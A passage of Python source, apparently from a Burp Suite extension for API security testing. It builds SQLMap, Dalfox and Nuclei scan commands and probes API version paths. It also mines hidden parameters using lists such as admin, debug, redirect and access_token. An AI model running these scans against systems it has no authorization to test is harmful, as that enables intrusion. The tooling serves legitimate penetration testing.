        meta = dict(self.sequence_invariant_meta or {})
        ledger = dict(self.sequence_invariant_ledger or {})
    with self.counterfactual_lock:
        counterfactual_count = len(self.counterfactual_findings or [])
        counterfactual_meta = dict(self.counterfactual_meta or {})
    with self.golden_ticket_lock:
        golden_count = len(self.golden_ticket_findings or [])
    with self.state_transition_lock:
        state_count = len(self.state_transition_findings or [])
    with self.token_lineage_lock:
        token_lineage_count = len(self.token_lineage_findings or [])
        token_lineage_meta = dict(self.token_lineage_meta or {})
    with self.parity_drift_lock:
        parity_count = len(self.parity_drift_findings or [])
        parity_meta = dict(self.parity_drift_meta or {})

    if (
        (not meta)
        and sequence_count <= 0
        and golden_count <= 0
        and state_count <= 0
        and token_lineage_count <= 0
        and parity_count <= 0
        and counterfactual_count <= 0
    ):
        return "Not generated yet (AI export computes this automatically)."

    source = self._ascii_safe(
        meta.get("source")
        or token_lineage_meta.get("source")
        or parity_meta.get("source")
        or "unknown"
    )
    diff_source = self._ascii_safe(counterfactual_meta.get("source") or source)
    scope = self._ascii_safe(
        meta.get("scope")
        or token_lineage_meta.get("scope")
        or parity_meta.get("scope")
        or "unknown"
    )
    generated_at = self._ascii_safe(
        meta.get("generated_at")
        or token_lineage_meta.get("generated_at")
        or parity_meta.get("generated_at")
        or counterfactual_meta.get("generated_at")
        or "unknown"
    )
    confidence_dist = dict(ledger.get("confidence_distribution", {}) or {})
    high_conf = int(confidence_dist.get("high", 0) or 0)
    return "Diff={} | Seq={} | Golden={} | State={} | Lineage={} | Parity={} | HighConf={} | Source={} | Scope={} | Updated={}".format(
        counterfactual_count,
        sequence_count,
        golden_count,
        state_count,
        token_lineage_count,
        parity_count,
        high_conf,
        diff_source,
        scope,
        generated_at,
    )

def _refresh_recon_invariant_status_label(self):
    """Refresh Recon footer status label for invariant cache state."""
    label = getattr(self, "recon_invariant_status_label", None)
    if label is None:
        return
    label.setText(self._build_recon_invariant_status_text())

def _refresh_recon_invariant_status_label_async(self):
    """Schedule Recon invariant status refresh on Swing UI thread."""
    if getattr(self, "recon_invariant_status_label", None) is None:
        return
    SwingUtilities.invokeLater(self._refresh_recon_invariant_status_label)

def _refresh_sequence_invariants_from_recon(self, event):
    """Recompute sequence invariants from Recon and refresh cache/status."""
    if not self.api_data:
        self.log_to_ui("[!] No endpoints captured for invariant refresh")
        self._refresh_recon_invariant_status_label_async()
        return

    label = getattr(self, "recon_invariant_status_label", None)
    if label is not None:
        label.setText("Refreshing invariants...")

    with self.lock:
        data_snapshot = dict(self.api_data)

    self.log_to_ui(
        "[*] Refreshing deep-logic analysis from Recon snapshot ({} endpoints)".format(
            len(data_snapshot)
        )
    )

    def worker():
        try:
            counterfactual_package = self._build_counterfactual_differential_package(
                data_snapshot
            )
            package = self._build_sequence_invariant_package(data_snapshot)
            golden_package = self._build_golden_ticket_package(data_snapshot)
            state_package = self._build_state_transition_package(data_snapshot)
            token_lineage_package = self._build_token_lineage_package(data_snapshot)
            parity_package = self._build_parity_drift_package(data_snapshot)
            self._sort_and_store_counterfactual_payload(
                counterfactual_package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            self._sort_and_store_sequence_invariant_payload(
                package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            self._sort_and_store_golden_ticket_payload(
                golden_package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            self._sort_and_store_state_transition_payload(
                state_package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            self._sort_and_store_token_lineage_payload(
                token_lineage_package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            self._sort_and_store_parity_drift_payload(
                parity_package,
                source_label="recon_refresh",
                scope_label="All Endpoints",
                target_count=len(data_snapshot),
            )
            counterfactual_count = int(
                counterfactual_package.get("finding_count", 0) or 0
            )
            finding_count = int(package.get("finding_count", 0) or 0)
            golden_count = int(golden_package.get("finding_count", 0) or 0)
            state_count = int(state_package.get("finding_count", 0) or 0)
            token_lineage_count = int(
                token_lineage_package.get("finding_count", 0) or 0
            )
            parity_count = int(parity_package.get("finding_count", 0) or 0)
            SwingUtilities.invokeLater(
                lambda d=counterfactual_count, c=finding_count, g=golden_count, s=state_count, tl=token_lineage_count, p=parity_count: self.log_to_ui(
                    "[+] Recon invariants refreshed (diff={} seq={} golden={} state={} lineage={} parity={})".format(
                        d, c, g, s, tl, p
                    )
                )
            )
        except Exception as e:
            err_msg = self._ascii_safe(e)
            SwingUtilities.invokeLater(
                lambda m=err_msg: self.log_to_ui(
                    "[!] Recon invariant refresh error: {}".format(m)
                )
            )
            SwingUtilities.invokeLater(self._refresh_recon_invariant_status_label)

    thread = threading.Thread(target=worker)
    thread.daemon = True
    thread.start()

def _normalize_profile(self, profile_value):
    """Normalize profile name to fast/balanced/deep."""
    raw = self._ascii_safe(profile_value, lower=True).strip()
    if raw in ["fast", "quick", "speed"]:
        return "fast"
    if raw in ["deep", "thorough", "max", "maximum"]:
        return "deep"
    return "balanced"

def _profile_labels(self):
    """Return shared profile labels used by scanner tuning controls."""
    return ["Fast", "Balanced", "Deep"]

def _selected_profile_value(self, combo):
    """Normalize selected profile label to helper profile key."""
    raw_value = self._ascii_safe(str(combo.getSelectedItem()) if combo else "")
    return self._normalize_profile(raw_value)

def _sqlmap_profile_settings(self, profile_value):
    """Return SQLMap tuning values for selected profile."""
    profile = self._normalize_profile(profile_value)
    if profile == "fast":
        return {
            "profile": profile,
            "level": "1",
            "risk": "1",
            "threads": "1",
            "sql_timeout": "6",
            "retries": "0",
        }
    if profile == "deep":
        return {
            "profile": profile,
            "level": "3",
            "risk": "2",
            "threads": "2",
            "sql_timeout": "12",
            "retries": "2",
        }
    return {
        "profile": "balanced",
        "level": "2",
        "risk": "1",
        "threads": "1",
        "sql_timeout": "8",
        "retries": "1",
    }

def _build_sqlmap_command(self, sqlmap_path, target, profile_value):
    """Build SQLMap command for one verification target."""
    cfg = self._sqlmap_profile_settings(profile_value)
    cmd = [
        sqlmap_path,
        "-u",
        target.get("url", ""),
        "--batch",
        "--level",
        cfg["level"],
        "--risk",
        cfg["risk"],
        "--threads",
        cfg["threads"],
        "--timeout",
        cfg["sql_timeout"],
        "--retries",
        cfg["retries"],
        "--flush-session",
    ]

    params = target.get("params", []) or []
    if params:
        cmd.extend(["-p", ",".join(params[:6])])

    method = (target.get("method") or "GET").upper()
    data = target.get("data") or ""
    if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
        cmd.extend(["--method", method, "--data", data[:1200]])
    return cmd, cfg

def _dalfox_profile_settings(self, profile_value):
    """Return Dalfox tuning values for selected profile."""
    profile = self._normalize_profile(profile_value)
    if profile == "fast":
        return {
            "profile": profile,
            "timeout": "6",
            "worker": "20",
            "skip_mining": True,
        }
    if profile == "deep":
        return {
            "profile": profile,
            "timeout": "12",
            "worker": "50",
            "skip_mining": False,
        }
    return {
        "profile": "balanced",
        "timeout": "8",
        "worker": "30",
        "skip_mining": True,
    }

def _build_dalfox_command(self, dalfox_path, target, out_file, profile_value):
    """Build Dalfox command for one verification target."""
    cfg = self._dalfox_profile_settings(profile_value)
    cmd = [
        dalfox_path,
        "url",
        target.get("url", ""),
        "--format",
        "jsonl",
        "-o",
        out_file,
        "-S",
        "--no-color",
        "--timeout",
        cfg["timeout"],
        "--worker",
        cfg["worker"],
    ]
    if cfg["skip_mining"]:
        cmd.extend(
            ["--skip-bav", "--skip-mining-all", "--skip-mining-dom", "--skip-headless"]
        )

    for param in (target.get("params", []) or [])[:4]:
        cmd.extend(["-p", param])

    method = (target.get("method") or "GET").upper()
    data = target.get("data") or ""
    if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
        cmd.extend(["-X", method, "-d", data[:1200]])
    return cmd, cfg

def _asset_profile_settings(self, profile_value):
    """Return API asset discovery stage tuning."""
    profile = self._normalize_profile(profile_value)
    if profile == "fast":
        return {
            "profile": profile,
            "subfinder_timeout": 150,
        }
    if profile == "deep":
        return {
            "profile": profile,
            "subfinder_timeout": 360,
        }
    return {
        "profile": "balanced",
        "subfinder_timeout": 240,
    }

def _nuclei_profile_settings(self, profile_value):
    """Return Nuclei tuning values for selected profile."""
    profile = self._normalize_profile(profile_value)
    if profile == "fast":
        return {
            "profile": profile,
            # Keep fast profile tightly focused on API surface discovery.
            "include_tags": "swagger,openapi,graphql",
            "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
            "request_timeout": 6,
            "retries": 0,
            "rate_limit": 50,
            "concurrency": 10,
            "bulk_size": 6,
            "max_host_error": 10,
            "scan_strategy": "host-spray",
            "max_scan_seconds": 300,
        }
    if profile == "deep":
        return {
            "profile": profile,
            # Deep profile adds config checks while staying API-centric.
            "include_tags": "swagger,openapi,graphql,auth,jwt,config",
            "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
            "request_timeout": 12,
            "retries": 2,
            "rate_limit": 40,
            "concurrency": 8,
            "bulk_size": 4,
            "max_host_error": 6,
            "scan_strategy": "host-spray",
            "max_scan_seconds": 1200,
        }
    return {
        "profile": "balanced",
        "include_tags": "swagger,openapi,graphql,auth,jwt",
        "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
        "request_timeout": 10,
        "retries": 1,
        "rate_limit": 70,
        "concurrency": 12,
        "bulk_size": 6,
        "max_host_error": 8,
        "scan_strategy": "host-spray",
        "max_scan_seconds": 900,
    }

def _evaluate_help_text(
    self, help_text, required_tokens=None, forbidden_tokens=None
):
    """Evaluate required/forbidden token health on help output."""
    lower_text = self._ascii_safe(help_text, lower=True)
    required = list(required_tokens or [])
    forbidden = list(forbidden_tokens or [])
    missing = [token for token in required if token.lower() not in lower_text]
    forbidden_found = [token for token in forbidden if token.lower() in lower_text]
    return {
        "missing": missing,
        "forbidden_found": forbidden_found,
        "healthy": (len(missing) == 0 and len(forbidden_found) == 0),
    }

def _add_target_scope_controls(self, controls):
    """Attach shared target-base scope controls for external tool tabs."""
    controls.add(
        self._create_action_button(
            "Target Bases...",
            Color(96, 125, 139),
            lambda e: self._open_target_base_scope_popup(),
        )
    )
    checkbox = JCheckBox(
        "Only Base+Derivatives", bool(self.target_base_scope_only_enabled)
    )
    checkbox.setToolTipText(
        "Restrict scans to popup base URLs/hosts and same base-domain derivatives."
    )
    checkbox.addActionListener(
        lambda _event, cb=checkbox: self._set_target_base_scope_only(
            cb.isSelected()
        )
    )
    controls.add(checkbox)
    self.target_scope_checkboxes.append(checkbox)

def _set_target_base_scope_only(self, enabled, persist=True):
    """Synchronize target-base-only scope state across tab checkboxes."""
    desired = bool(enabled)
    changed = desired != bool(self.target_base_scope_only_enabled)
    self.target_base_scope_only_enabled = desired
    if self._syncing_target_scope_checkboxes:
        return
    self._syncing_target_scope_checkboxes = True
    try:
        for checkbox in self.target_scope_checkboxes:
            if checkbox is None:
                continue
            if checkbox.isSelected() != desired:
                checkbox.setSelected(desired)
    finally:
        self._syncing_target_scope_checkboxes = False

    if changed:
        state = "enabled" if desired else "disabled"
        self.log_to_ui("[*] Base URL scope mode {}".format(state))
    if persist:
        self._save_bool_setting("target_base_scope_only_enabled", desired)

def _add_force_kill_button(self, controls, output_area=None):
    """Attach emergency kill button for external scanner processes."""

    def on_click(_event):
        area = output_area() if callable(output_area) else output_area
        self._pkill_external_tools(area)

    controls.add(
        self._create_action_button(
            "PKill Tools",
            Color(183, 28, 28),
            on_click,
        )
    )

def _create_command_preset_combo(
    self, field, checkbox, presets, help_label=None, auto_enable=False
):
    """Create preset dropdown that populates command field from templates."""
    labels = ["Preset Cmd..."]
    labels.extend([label for label, _, _ in presets])
    combo = JComboBox(labels)
    if labels:
        combo.setPrototypeDisplayValue(max(labels, key=len))
    combo.setToolTipText(
        "Select a preset to auto-fill the command textbox"
    )

    def on_select(_event):
        idx = combo.getSelectedIndex()
        if idx <= 0:
            return
        _, template, description = presets[idx - 1]
        field.setText(template)
        if auto_enable:
            checkbox.setSelected(True)
        if help_label:
            hint = description
            if not checkbox.isSelected():
                hint = "{} Check 'Enable Custom' to run it.".format(description)
            help_label.setText("Preset Help: {}".format(hint))
            help_label.setToolTipText(hint)
        combo.setSelectedIndex(0)

    combo.addActionListener(on_select)
    return combo

def _create_preset_help_button(
    self,
    title,
    placeholders,
    presets,
    usage_notes=None,
    override_notes=None,
):
    """Create small help button that explains commands and override usage."""
    btn = JButton("?")
    btn.setToolTipText("Show command usage and preset help")

    def on_help(_event):
        lines = []
        lines.append("{} Command Help".format(title))
        lines.append("=" * 60)
        lines.append("")
        lines.append("Quick Start:")
        lines.append("  1) Default mode: leave 'Enable Custom' unchecked.")
        lines.append(
            "  2) Override mode: check 'Enable Custom' and provide Command text."
        )
        lines.append(
            "  3) Preset dropdown fills Command text only; override stays opt-in."
        )
        lines.append("  4) Use Stop button to cancel long-running scans.")
        if usage_notes:
            lines.append("")
            lines.append("Tool Notes:")
            for note in usage_notes:
                lines.append("  - {}".format(note))
        lines.append("Placeholders:")
        for placeholder in placeholders:
            lines.append("  - {}".format(placeholder))
        lines.append("")
        lines.append("Override Rules:")
        lines.append("  - Custom command must be valid shell syntax.")
        lines.append("  - Unknown placeholders are rejected.")
        lines.append("  - Empty custom command is rejected when override is enabled.")
        if override_notes:
            for note in override_notes:
                lines.append("  - {}".format(note))
        lines.append("")
        lines.append("Available Presets:")
        for label, template, description in presets:
            lines.append("")
            lines.append("[{}]".format(label))
            lines.append("  {}".format(description))
            lines.append("  {}".format(template))

        JOptionPane.showMessageDialog(
            self._panel,
            "\n".join(lines),
            "{} Command Help".format(title),
            JOptionPane.INFORMATION_MESSAGE,
        )

    btn.addActionListener(on_help)
    return btn

def _create_text_area_panel(self):
    """Helper to create read-only text area with scroll"""
    area = JTextArea()
    area.setEditable(False)
    area.setFont(Font("Monospaced", Font.PLAIN, 11))
    return area, JScrollPane(area)

def _show_recon_button_help(self, _event=None):
    """Show Recon button reference to reduce UI ambiguity."""
    lines = []
    lines.append("Recon Button Help")
    lines.append("=" * 60)
    lines.append("")
    lines.append("Export All:")
    lines.append("  Export full Recon dataset and analysis to JSON.")
    lines.append("Export Host:")
    lines.append("  Export only endpoints matching the selected host filter.")
    lines.append("Export AI Bundle:")
    lines.append("  Export all-tab AI bundle (includes Differential, Sequence, Golden, State Matrix, Token Lineage, and Parity Drift findings).")
    lines.append("Import:")
    lines.append("  Import Recon JSON, Excalibur HAR/replay/cookies sidecars, or bridge bundle JSON.")
    lines.append("  Excalibur imports auto-trigger deep-logic invariant refresh.")
    lines.append("Postman:")
    lines.append("  Export scoped endpoints to Postman Collection v2.1.")
    lines.append("Insomnia:")
    lines.append("  Export scoped endpoints to Insomnia import JSON.")
    lines.append("Tool Health:")
    lines.append("  Verify local external-tool binaries and key options.")
    lines.append("Grep:")
    lines.append("  Search captured request/response history using regex and extract matches.")
    lines.append("Turbo Pack:")
    lines.append("  Export Turbo Intruder-ready scripts and request templates from Recon scope.")
    lines.append("Hidden Params:")
    lines.append("  Generate ranked hidden-parameter candidates from captured Recon endpoints.")
    lines.append("Param Intel:")
    lines.append("  Build a global parameter inventory with source and endpoint overlap insights.")
    lines.append("Export Param Intel:")
    lines.append("  Export the latest parameter-intelligence snapshot to JSON and text report.")
    lines.append("Button Help:")
    lines.append("  Show this reference dialog.")
    lines.append("Clear Data:")
    lines.append("  Clear captured Recon state and UI list/details.")
    lines.append("Refresh:")
    lines.append("  Recompute and redraw both Recon and Logger views from current state.")
    lines.append("Clear + Refill:")
    lines.append("  Clear current Recon/Logger data, then refill both from Burp Proxy history.")
    lines.append("Refresh Invariants:")
    lines.append("  Recompute Differential + Sequence + Golden + State Matrix + Token Lineage + Parity Drift analysis from captured endpoints.")
    lines.append("")
    lines.append("Tip: hover any Recon button to see a quick tooltip.")
    JOptionPane.showMessageDialog(
        self._panel,
        "\n".join(lines),
        "Recon Button Help",
        JOptionPane.INFORMATION_MESSAGE,
    )

def _copy_to_clipboard(self, text):
    """Copy text to system clipboard"""
    from java.awt import Toolkit
    from java.awt.datatransfer import StringSelection

    if text:
        selection = StringSelection(text)
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(selection, None)
        self.log_to_ui("[+] Copied {} chars to clipboard".format(len(text)))
    else:
        self.log_to_ui("[!] No text to copy")

def _export_text_output_to_ai(self, source_label, output_text):
    title = self._ascii_safe(source_label or "Output")
    content = self._ascii_safe(output_text or "").strip()
    if not content:
        self.log_to_ui("[!] {}: no output to export for AI".format(title))
        return

    prompt_lines = [
        "You are a senior API security analyst.",
        "Analyze the provided tool output and produce practical, high-signal findings.",
        "Prioritize likely exploitable issues and avoid generic advice.",
        "Return:",
        "1) top findings with severity/confidence/evidence",
        "2) concrete repro or validation steps",
        "3) defensive fixes",
        "4) a short testing plan for next iteration",
    ]
    export_lines = [
        "=== AI ANALYSIS PACK: {} ===".format(title),
        "Generated: {}".format(time.strftime("%Y-%m-%d %H:%M:%S")),
        "",
        "SMART PROMPT:",
        "\n".join(prompt_lines),
        "",
        "TOOL OUTPUT:",
        content,
    ]
    payload = "\n".join(export_lines)
    if hasattr(self, "_show_ai_copy_exit_dialog"):
        self._show_ai_copy_exit_dialog("AI Export - {}".format(title), payload, rows=30, cols=140)
    elif hasattr(self, "_show_text_dialog"):
        self._show_text_dialog("AI Export - {}".format(title), payload, rows=30, cols=140)
        self._copy_to_clipboard(payload)
    else:
        self._copy_to_clipboard(payload)
    self.log_to_ui("[+] AI export ready for {}".format(title))

def _create_diff_tab(self):
    """Create the Diff comparison tab"""
    panel = JPanel(BorderLayout())
    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel("Compare:"))
    controls.add(
        JButton("Load Export 1").addActionListener(
            lambda e: self._load_diff_file(1)
        )
        or JButton("Load Export 1")
    )
    controls.add(
        JButton("Load Export 2").addActionListener(
            lambda e: self._load_diff_file(2)
        )
        or JButton("Load Export 2")
    )
    controls.add(
        self._create_action_button(
            "Compare", Color(40, 167, 69), lambda e: self._run_diff()
        )
    )
    controls.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.diff_area.setText("")
        )
    )
    controls.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.diff_area.getText()),
        )
    )
    controls.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("Diff", self.diff_area.getText()),
        )
    )
    panel.add(controls, BorderLayout.NORTH)
    self.diff_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.diff_file1 = None
    self.diff_file2 = None
    return panel

def _load_diff_file(self, slot):
    chooser = JFileChooser()
    if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
        filepath = chooser.getSelectedFile().getAbsolutePath()
        if slot == 1:
            self.diff_file1 = filepath
            self.log_to_ui("[+] Loaded Export 1: {}".format(filepath))
        else:
            self.diff_file2 = filepath
            self.log_to_ui("[+] Loaded Export 2: {}".format(filepath))

def _run_diff(self):
    if not self.diff_file1 or not self.diff_file2:
        self.diff_area.setText("Load both exports first")
        return

    try:
        with open(self.diff_file1) as f:
            data1 = json.load(f)
        with open(self.diff_file2) as f:
            data2 = json.load(f)

        eps1 = set([ep["endpoint"] for ep in data1["endpoints"]])
        eps2 = set([ep["endpoint"] for ep in data2["endpoints"]])

        added = eps2 - eps1
        removed = eps1 - eps2
        common = eps1 & eps2

        result = []
        result.append("=" * 80)
        result.append("DIFF COMPARISON")
        result.append("=" * 80)
        result.append("Export 1: {} endpoints".format(len(eps1)))
        result.append("Export 2: {} endpoints".format(len(eps2)))
        result.append("")
        result.append("Added: {} endpoints".format(len(added)))
        for ep in sorted(added)[:20]:
            result.append("  + {}".format(ep))
        result.append("")
        result.append("Removed: {} endpoints".format(len(removed)))
        for ep in sorted(removed)[:20]:
            result.append("  - {}".format(ep))
        result.append("")
        result.append("Unchanged: {} endpoints".format(len(common)))

        self.diff_area.setText("\n".join(result))
        self.log_to_ui(
            "[+] Diff complete: +{} -{} ={}".format(
                len(added), len(removed), len(common)
            )
        )
    except Exception as e:
        self.diff_area.setText("Error: {}".format(str(e)))

def _create_scanner_tab(self, label, default_input, button_text, action, area_attr):
    """Helper to create scanner-style tabs"""
    panel = JPanel(BorderLayout())
    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel(label))
    input_field = JTextField(default_input, 30)
    controls.add(input_field)
    controls.add(
        self._create_action_button(button_text, Color(40, 167, 69), action)
    )
    panel.add(controls, BorderLayout.NORTH)
    area, scroll = self._create_text_area_panel()
    setattr(self, area_attr, area)
    setattr(self, area_attr.replace("_area", "_input"), input_field)
    panel.add(scroll, BorderLayout.CENTER)
    return panel

def _create_version_tab(self):
    """Create Version Scanner tab"""
    panel = JPanel(BorderLayout())

    # Top controls
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    # Input row
    input_row = JPanel(FlowLayout(FlowLayout.LEFT))
    input_row.add(JLabel("Versions:"))
    self.version_input = JTextField(
        "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated",
        35,
    )
    input_row.add(self.version_input)

    # Preset buttons
    preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
    preset_row.add(JLabel("Presets:"))
    preset_row.add(
        self._create_action_button(
            "Standard",
            Color(108, 117, 125),
            lambda e: self.version_input.setText(
                "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Decimal",
            Color(108, 117, 125),
            lambda e: self.version_input.setText(
                "v1.0,v1.1,v2.0,v2.1,v3.0,api/v1.0,api/v2.0"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Environments",
            Color(108, 117, 125),
            lambda e: self.version_input.setText(
                "dev,test,staging,beta,alpha,prod,internal"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Legacy",
            Color(108, 117, 125),
            lambda e: self.version_input.setText(
                "old,legacy,deprecated,v0,archive,backup"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "All",
            Color(108, 117, 125),
            lambda e: self.version_input.setText(
                "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated"
            ),
        )
    )

    # Action buttons
    action_row = JPanel(FlowLayout(FlowLayout.LEFT))
    self.version_lenient_checkbox = JCheckBox("Lenient JSON GET", True)
    self.version_lenient_checkbox.setToolTipText(
        "Include JSON/XML GET routes without explicit /api/ marker"
    )
    action_row.add(self.version_lenient_checkbox)
    action_row.add(
        self._create_action_button(
            "Scan Versions", Color(40, 167, 69), lambda e: self._scan_versions()
        )
    )
    action_row.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_version_results(),
        )
    )
    action_row.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.version_area.setText("")
        )
    )
    action_row.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.version_area.getText()),
        )
    )
    action_row.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "Version Scanner", self.version_area.getText()
            ),
        )
    )

    top_panel.add(input_row)
    top_panel.add(preset_row)
    top_panel.add(action_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.version_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    return panel

def _format_result(self, title, lines):
    """Helper to format result output"""
    # Decode HTML entities
    formatted_lines = []
    for line in lines:
        line = (
            line.replace("&gt;", ">")
            .replace("&lt;", "<")
            .replace("&amp;", "&")
            .replace("&quot;", '"')
            .replace("&#39;", "'")
        )
        formatted_lines.append(line)
    return "\n".join([title, "=" * 80, ""] + formatted_lines)

def _scan_versions(self):
    versions = [
        v.strip() for v in self.version_input.getText().split(",") if v.strip()
    ]
    self.version_results = []
    lines = []
    excluded_missing_host = 0
    lenient_mode = bool(
        hasattr(self, "version_lenient_checkbox")
        and self.version_lenient_checkbox is not None
        and self.version_lenient_checkbox.isSelected()
    )

    api_endpoints, filter_meta = self._collect_version_targets(lenient=lenient_mode)

    if not api_endpoints:
        self.version_area.setText(
            "[!] No API endpoints found (filtered out static/noisy endpoints)\n"
        )
        return

    for key, entries in api_endpoints.items():
        entry = self._get_entry(entries)
        normalized = self._normalize_endpoint_data(entry)
        path = normalized.get("path") or "/"
        host = self._ascii_safe(normalized.get("host"), lower=True).strip() or self._ascii_safe(
            entry.get("host"), lower=True
        ).strip()
        protocol = self._ascii_safe(
            normalized.get("protocol"), lower=True
        ).strip() or self._ascii_safe(entry.get("protocol"), lower=True).strip() or "https"
        if not host:
            excluded_missing_host += 1
            continue

        for ver in versions:
            test_path = self._build_version_test_path(path, ver)
            result = "Test: {} -> {}://{}{}".format(key, protocol, host, test_path)
            lines.append(result)
            self.version_results.append(result)

    summary = []
    summary.append(
        "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
    )
    summary.append(
        "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
            len(api_endpoints), filter_meta.get("excluded_endpoints", 0)
        )
    )
    if excluded_missing_host:
        summary.append(
            "[*] Skipped: {} endpoints missing host metadata".format(
                excluded_missing_host
            )
        )
    summary.append("[*] Testing {} version variations".format(len(versions)))
    summary.append("[*] Total tests: {}\n".format(len(self.version_results)))

    self.version_area.setText(
        self._format_result(
            "Version Discovery: {}".format(", ".join(versions)), summary + lines
        )
    )
    self.log_to_ui(
        "[*] Version scan: {} API endpoints, {} tests".format(
            len(api_endpoints), len(self.version_results)
        )
    )

def _build_version_test_path(self, path, version_value):
    """Build version probe path while preserving existing versioned routes when possible."""
    normalized_path = self._ascii_safe(path or "/")
    if not normalized_path.startswith("/"):
        normalized_path = "/" + normalized_path
    token = self._ascii_safe(version_value or "").strip().strip("/")
    if not token:
        return normalized_path

    existing_version = self._extract_version_segment(normalized_path)

    if existing_version and "/" not in token:
        replaced = re.sub(
            r"/" + re.escape(existing_version) + r"(?=/|$)",
            "/" + token,
            normalized_path,
            count=1,
        )
        if replaced:
            return replaced

    if existing_version and token.startswith("api/"):
        replaced = re.sub(
            r"/api/" + re.escape(existing_version) + r"(?=/|$)",
            "/" + token,
            normalized_path,
            count=1,
        )
        if replaced:
            return replaced

    if normalized_path == "/":
        return "/" + token
    return "/" + token + normalized_path

def _export_version_results(self):
    """Export version scan results - only saves when user clicks Export"""
    if not hasattr(self, "version_results") or not self.version_results:
        self.version_area.append("\n[!] Run 'Scan Versions' first\n")
        return
    import os

    export_dir = self._get_export_dir("VersionScan_Export")
    if not export_dir:
        return
    filepath = os.path.join(export_dir, "version_scan.txt")
    writer = None
    try:
        writer = FileWriter(filepath)
        for result in self.version_results:
            writer.write(result + "\n")
        self.version_area.append(
            "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                len(self.version_results), export_dir, filepath
            )
        )
        self.log_to_ui("[+] Exported version scan to: {}".format(export_dir))
    except Exception as e:
        self.version_area.append("\n[!] Export failed: {}\n".format(str(e)))
    finally:
        if writer:
            try:
                writer.close()
            except Exception as e:
                self._callbacks.printError(
                    "Error closing version scan file: {}".format(str(e))
                )

def _create_param_tab(self):
    """Create Param Miner tab"""
    panel = JPanel(BorderLayout())

    # Top controls
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    # Input row
    input_row = JPanel(FlowLayout(FlowLayout.LEFT))
    input_row.add(JLabel("Params:"))
    self.param_input = JTextField(
        "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key",
        35,
    )
    input_row.add(self.param_input)

    # Preset buttons
    preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
    preset_row.add(JLabel("Presets:"))
    preset_row.add(
        self._create_action_button(
            "Admin",
            Color(108, 117, 125),
            lambda e: self.param_input.setText(
                "admin,is_admin,isAdmin,role,admin_panel,administrator"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Debug",
            Color(108, 117, 125),
            lambda e: self.param_input.setText(
                "debug,verbose,trace,log,logging,dev_mode,test_mode"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Access",
            Color(108, 117, 125),
            lambda e: self.param_input.setText(
                "internal,private,hidden,secret,key,token,access"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "Callback",
            Color(108, 117, 125),
            lambda e: self.param_input.setText(
                "callback,redirect,url,return_url,next,dest,destination"
            ),
        )
    )
    preset_row.add(
        self._create_action_button(
            "All",
            Color(108, 117, 125),
            lambda e: self.param_input.setText(
                "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key"
            ),
        )
    )

    # Action buttons
    action_row = JPanel(FlowLayout(FlowLayout.LEFT))
    self.param_lenient_checkbox = JCheckBox("Lenient JSON GET", True)
    self.param_lenient_checkbox.setToolTipText(
        "Include structured GET routes even without explicit /api/ marker"
    )
    action_row.add(self.param_lenient_checkbox)
    action_row.add(
        self._create_action_button(
            "Mine Params", Color(40, 167, 69), lambda e: self._mine_params()
        )
    )
    action_row.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_param_results(),
        )
    )
    action_row.add(
        self._create_action_button(
